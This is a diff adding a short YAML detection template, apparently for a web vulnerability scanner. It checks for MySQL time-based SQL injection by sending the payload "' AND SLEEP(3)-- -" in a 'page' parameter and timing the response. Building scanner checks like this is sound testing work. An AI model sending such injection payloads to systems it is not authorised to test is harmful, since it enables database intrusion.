@@ -1,0 +1,19 @@
+id: patt-sqli-mysql-time-01-page
+name: 'PATT sqli patt-sqli-mysql-time-01 via page'
+severity: high
+type: active
+tags:
+  - sqli
+  - patt
+requires:
+  - php
+description: 'PATT MySQL time-based SLEEP(3). [patt:patt-sqli-mysql-time-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/MySQL%20Injection.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      page:
+        - ''' AND SLEEP(3)-- -'
+    matchers:
+      - type: time
+        ms: 2500
